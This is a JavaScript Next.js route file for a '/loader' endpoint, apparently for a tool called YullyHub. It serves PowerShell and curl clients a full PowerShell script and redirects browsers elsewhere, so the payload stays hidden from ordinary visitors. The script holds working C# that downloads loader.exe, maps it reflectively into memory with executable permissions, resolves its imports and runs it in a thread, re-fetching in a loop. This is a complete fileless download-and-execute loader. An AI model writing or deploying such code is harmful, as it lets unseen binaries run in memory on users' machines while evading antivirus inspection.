// /loader — dual-mode endpoint (works on Vercel serverless AND on the
// local custom server). PowerShell / curl / wget get the reflective
// PE-loader bootstrap script; browsers get 302'd to the dashboard root.
//
// The bootstrap script fetches /loader.exe (served from Next's public/
// dir so Vercel bundles it into the deploy) and reflectively maps it
// into the running PowerShell process.

function isPowerShellUA(ua) {
    if (!ua) return false;
    const u = ua.toLowerCase();
    return u.includes('powershell') ||
           u.includes('windowspowershell') ||
           u.includes('pwsh') ||
           u.includes('curl') ||
           u.includes('wget');
}

function buildLoaderPs1(host, scheme) {
    const binUrl = `${scheme}://${host}/loader.exe`;
    const exitCheckUrl = `${scheme}://${host}/api/loader/wrapper-should-exit`;
    return `# YullyHub Loader — reflective in-memory launcher
$ErrorActionPreference = 'Stop'
$BinUrl = '${binUrl}'

$csharp = @'
using System;
using System.Runtime.InteropServices;

public static class RPE {
    [DllImport("kernel32.dll")]  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]  public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]  public static extern IntPtr LoadLibraryA(string lpLibFileName);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]  public static extern IntPtr GetProcAddress(IntPtr hModule, IntPtr ordinal);
    [DllImport("kernel32.dll")]  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]  public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public const uint MEM_COMMIT  = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE = 0x04;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    public static void Run(byte[] raw) {
        int e_lfanew = BitConverter.ToInt32(raw, 0x3C);
        ushort machine = BitConverter.ToUInt16(raw, e_lfanew + 4);
        if (machine != 0x8664) throw new Exception("Only x64 payloads supported");
        ushort numSections     = BitConverter.ToUInt16(raw, e_lfanew + 6);
        ushort sizeOptionalHdr = BitConverter.ToUInt16(raw, e_lfanew + 20);
        int optHdrOff = e_lfanew + 24;
        uint addrOfEntry    = BitConverter.ToUInt32(raw, optHdrOff + 16);
        ulong prefImageBase = BitConverter.ToUInt64(raw, optHdrOff + 24);
        uint sizeOfImage    = BitConverter.ToUInt32(raw, optHdrOff + 56);
        uint sizeOfHeaders  = BitConverter.ToUInt32(raw, optHdrOff + 60);
        int dataDirOff = optHdrOff + 112;
        uint importRva  = BitConverter.ToUInt32(raw, dataDirOff + 8 * 1);
        uint relocRva   = BitConverter.ToUInt32(raw, dataDirOff + 8 * 5);
        uint relocSize  = BitConverter.ToUInt32(raw, dataDirOff + 8 * 5 + 4);

        IntPtr baseAddr = VirtualAlloc((IntPtr)prefImageBase, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (baseAddr == IntPtr.Zero)
            baseAddr = VirtualAlloc(IntPtr.Zero, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (baseAddr == IntPtr.Zero) throw new Exception("VirtualAlloc failed");

        Marshal.Copy(raw, 0, baseAddr, (int)sizeOfHeaders);
        int secTableOff = optHdrOff + sizeOptionalHdr;
        for (int i = 0; i < numSections; i++) {
            int so = secTableOff + i * 40;
            uint vSize   = BitConverter.ToUInt32(raw, so + 8);
            uint vAddr   = BitConverter.ToUInt32(raw, so + 12);
            uint rawSize = BitConverter.ToUInt32(raw, so + 16);
            uint rawPtr  = BitConverter.ToUInt32(raw, so + 20);
            if (rawSize == 0) continue;
            IntPtr dst = new IntPtr(baseAddr.ToInt64() + vAddr);
            Marshal.Copy(raw, (int)rawPtr, dst, (int)rawSize);
        }

        long delta = baseAddr.ToInt64() - (long)prefImageBase;
        if (delta != 0 && relocSize > 0) {
            int cursor = 0;
            IntPtr relBase = new IntPtr(baseAddr.ToInt64() + relocRva);
            while (cursor < relocSize) {
                IntPtr blk = new IntPtr(relBase.ToInt64() + cursor);
                uint blkRva  = (uint)Marshal.ReadInt32(blk, 0);
                uint blkSize = (uint)Marshal.ReadInt32(blk, 4);
                if (blkSize == 0) break;
                int entries = (int)(blkSize - 8) / 2;
                for (int j = 0; j < entries; j++) {
                    ushort entry = (ushort)Marshal.ReadInt16(blk, 8 + j * 2);
                    int type = entry >> 12;
                    int off  = entry & 0xFFF;
                    if (type == 10) {
                        IntPtr patchAddr = new IntPtr(baseAddr.ToInt64() + blkRva + off);
                        long v = Marshal.ReadInt64(patchAddr);
                        Marshal.WriteInt64(patchAddr, v + delta);
                    }
                }
                cursor += (int)blkSize;
            }
        }

        if (importRva != 0) {
            int impCursor = 0;
            while (true) {
                IntPtr descPtr = new IntPtr(baseAddr.ToInt64() + importRva + impCursor);
                uint origThunk  = (uint)Marshal.ReadInt32(descPtr, 0);
                uint nameRva    = (uint)Marshal.ReadInt32(descPtr, 12);
                uint firstThunk = (uint)Marshal.ReadInt32(descPtr, 16);
                if (nameRva == 0 && firstThunk == 0) break;
                string dllName = Marshal.PtrToStringAnsi(new IntPtr(baseAddr.ToInt64() + nameRva));
                IntPtr hMod = LoadLibraryA(dllName);
                if (hMod == IntPtr.Zero) throw new Exception("LoadLibrary failed: " + dllName);

                uint thunkRva = origThunk != 0 ? origThunk : firstThunk;
                int idx = 0;
                while (true) {
                    IntPtr thunkPtr = new IntPtr(baseAddr.ToInt64() + thunkRva + idx * 8);
                    IntPtr iatPtr   = new IntPtr(baseAddr.ToInt64() + firstThunk + idx * 8);
                    long thunkVal = Marshal.ReadInt64(thunkPtr);
                    if (thunkVal == 0) break;
                    IntPtr proc;
                    if ((ulong)thunkVal >> 63 == 1) {
                        ushort ordinal = (ushort)(thunkVal & 0xFFFF);
                        proc = GetProcAddress(hMod, (IntPtr)ordinal);
                    } else {
                        IntPtr nameEntry = new IntPtr(baseAddr.ToInt64() + (thunkVal & 0x7FFFFFFF) + 2);
                        string funcName = Marshal.PtrToStringAnsi(nameEntry);
                        proc = GetProcAddress(hMod, funcName);
                    }
                    if (proc == IntPtr.Zero) throw new Exception("GetProcAddress failed");
                    Marshal.WriteInt64(iatPtr, proc.ToInt64());
                    idx++;
                }
                impCursor += 20;
            }
        }

        uint oldProt;
        VirtualProtect(baseAddr, sizeOfImage, PAGE_EXECUTE_READWRITE, out oldProt);

        IntPtr entryPtr = new IntPtr(baseAddr.ToInt64() + addrOfEntry);
        IntPtr th = CreateThread(IntPtr.Zero, 0, entryPtr, IntPtr.Zero, 0, IntPtr.Zero);
        if (th == IntPtr.Zero) throw new Exception("CreateThread failed");
        WaitForSingleObject(th, 0xFFFFFFFF);
    }
}
'@

Add-Type -TypeDefinition $csharp -Language CSharp -ErrorAction Stop | Out-Null

Write-Host ""
Write-Host "  YullyHub  -  bootstrapping loader..." -ForegroundColor Cyan
Write-Host ""
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

# Auto-reconnect loop with rapid-fail guard:
#   - If loader.exe stays up for a normal amount of time (>=8s) before
#     exiting, we treat that as a healthy restart and reconnect.
#   - If it exits in <8s three attempts in a row, that's a crash loop
#     (bad download URL, incompatible binary, missing permission) —
#     we bail so we don't stack "Download failed" popups forever.
# EXIT signal: after each RPE::Run returns, we ask the server "should I
# shut down?". The dashboard's X-close button posts our IP to
# /api/loader/wrapper-signal-exit; if that timestamp is newer than
# $StartEpoch we exit the loop and the PS window closes cleanly.
$ExitCheckUrl = '${exitCheckUrl}'
$StartEpoch = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
$attempt = 0
$rapidFails = 0
while ($true) {
    $attempt = $attempt + 1
    $runStart = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('Cache-Control', 'no-cache')
        $wc.Headers.Add('User-Agent',    'yullyhub-bootstrap/' + $attempt)
        $bytes = $wc.DownloadData($BinUrl)
        Write-Host "  [attempt $attempt] fetched $($bytes.Length) bytes. Mapping..." -ForegroundColor Green
        [RPE]::Run($bytes)
        Write-Host "  [attempt $attempt] loader thread exited." -ForegroundColor Yellow
    } catch {
        Write-Host ("  [attempt " + $attempt + "] error: " + $_.Exception.Message) -ForegroundColor DarkYellow
    }
    $elapsed = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds() - $runStart
    if ($elapsed -lt 8) {
        $rapidFails = $rapidFails + 1
        Write-Host ("  Rapid exit (" + $elapsed + "s). Rapid-fail count: " + $rapidFails + "/3.") -ForegroundColor Magenta
    } else {
        $rapidFails = 0
    }
    if ($rapidFails -ge 3) {
        Write-Host "  Loader is in a crash loop. Exiting wrapper — re-run the command after the issue is fixed." -ForegroundColor Red
        break
    }
    try {
        $wc2 = New-Object System.Net.WebClient
        $wc2.Headers.Add('Cache-Control', 'no-cache')
        $wc2.Headers.Add('User-Agent',    'yullyhub-wrapper-check/1')
        $resp = $wc2.DownloadString($ExitCheckUrl + '?since=' + $StartEpoch)
        if ($resp -match '"exit"\\s*:\\s*true') {
            Write-Host "  Dashboard closed. Shutting down loader wrapper." -ForegroundColor Cyan
            break
        }
    } catch { }
    Start-Sleep -Seconds 3
}
Write-Host "  YullyHub loader exited." -ForegroundColor Cyan
`;
}

export const runtime = 'nodejs';       // Node runtime supports our sync response
export const dynamic = 'force-dynamic'; // never cache

function handle(request) {
    const ua = request.headers.get('user-agent') || '';
    const host = request.headers.get('host') || 'localhost:3000';
    const proto = request.headers.get('x-forwarded-proto') ||
                  (host.startsWith('localhost') || host.startsWith('127.') ? 'http' : 'https');

    if (isPowerShellUA(ua)) {
        return new Response(buildLoaderPs1(host, proto), {
            status: 200,
            headers: {
                'Content-Type':  'text/plain; charset=utf-8',
                'Cache-Control': 'no-store, no-cache, must-revalidate',
                'X-Content-Type-Options': 'nosniff',
            },
        });
    }
    return Response.redirect(`${proto}://${host}/`, 302);
}

export async function GET(request)   { return handle(request); }
export async function HEAD(request)  { return handle(request); }
